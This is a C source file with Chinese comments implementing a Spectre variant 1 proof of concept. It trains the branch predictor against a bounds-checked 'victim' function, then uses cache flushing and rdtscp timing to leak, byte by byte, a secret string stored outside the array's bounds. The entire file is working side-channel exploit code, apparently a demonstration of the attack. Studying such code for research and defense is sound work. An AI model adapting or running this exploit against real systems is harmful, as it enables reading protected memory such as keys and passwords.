#include <stdint.h>
#include <stdio.h>
#include <string.h>
#include <x86intrin.h>

/*======================= Victim Code =========================*/

#define CACHE_LINE_SIZE (64 * 8)
unsigned int spy_size = 16; // 用于越界读取 secret 数据的数组大小
uint8_t unused1[64];        // 在 spy 数组前添加 64 字节的无用数据
uint8_t spy[16] = {1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16};
uint8_t unused2[64]; // 在 spy 数组后添加 64 字节的无用数据
uint8_t cache_set[256 * CACHE_LINE_SIZE]; // 用于缓存侧信道攻击的数组

char *secret = "You should not be able to read this.";

uint8_t temp = 0; // 用于防止编译器优化 victim_function 函数

void victim_function(size_t x) {
    if (x < spy_size) {
        temp &=
            cache_set[spy[x] *
                      CACHE_LINE_SIZE]; // 将 cache_set 数组中的数据读取到缓存中
    }
}

/*======================= Attack Code ==========================*/

#define CACHE_HIT_THRESHOLD (100)

void readMemoryByte(size_t malicious_x, uint8_t *value, int *hit_time) {
    static int results[256];
    unsigned int junk = 0;
    size_t training_x, x;
    register uint64_t time1, time2;
    volatile uint8_t *addr;

    for (int i = 0; i < 256; i++) {
        results[i] = 0;
    }

    for (int tries = 0; tries < 1000; tries++) {
        // 清除缓存
        for (int i = 0; i < 256; i++) {
            _mm_clflush(&cache_set[i * CACHE_LINE_SIZE]);
        }

        // 每训练 5 次，攻击 1 次，重复 6 遍
        training_x = tries % spy_size;
        for (int i = 29; i >= 0; i--) {
            _mm_clflush(&spy_size);

            // 通过循环延迟，使得能够在后续读取到缓存中的数据
            for (volatile int z = 0; z < 100; z++) {
            }

            // 使用位运算，实现 x 训练 5 次，攻击 1 次
            // 避免使用 if 导致 branch prediction
            x = ((i % 6) - 1) & ~0xFFFF;
            x = (x | (x >> 16));
            x = training_x ^ (x & (malicious_x ^ training_x));

            victim_function(x);
        }

        for (int i = 0; i < 256; i++) {
            int mix_i = ((i * 167) + 13) &
                        255; // 乱序遍历 0-255， 防止 stride prediction

            addr = &cache_set[mix_i * CACHE_LINE_SIZE];
            time1 = __rdtscp(&junk);
            junk = *addr; // 访问 cache_set 数组中的数据
            time2 = __rdtscp(&junk) - time1;

            // 如果访问时间小于阈值，说明访问的数据在缓存中
            if (time2 <= CACHE_HIT_THRESHOLD && mix_i != spy[training_x]) {
                results[mix_i]++;
            }
        }
    }

    int max = -1;
    for (int i = 0; i < 256; i++) {
        if (max < 0 || results[i] >= results[max]) {
            max = i;
        }
    }

    results[0] ^= junk; // 用于防止编译器优化
    *value = (uint8_t)max;
    *hit_time = results[max];
}

int main() {
    printf("The information to be stolen is '%s', address %p\n", secret,
           (void *)secret);

    size_t malicious_x = (size_t)(secret - (char *)spy);

    // 写入 cache_set 避免在缓存中 cache_set 是 copy on write 的
    for (size_t i = 0; i < sizeof(cache_set); i++) {
        cache_set[i] = 1;
    }

    int hit_time, len = strlen(secret);
    uint8_t value;

    char best_ans[len + 1];

    printf("Reading %d bytes:\n", len);
    for (int i = 0; i < len; i++) {
        printf("Reading at %p... ", (void *)malicious_x);
        readMemoryByte(malicious_x++, &value, &hit_time);
        printf("'%c', probability = %f",
               (value > 31 && value < 127 ? value : '?'), hit_time / 1000.0);
        printf("\n");
        best_ans[i] = value;
    }
    printf("The most probable secret is '%s'\n", best_ans);

    return 0;
}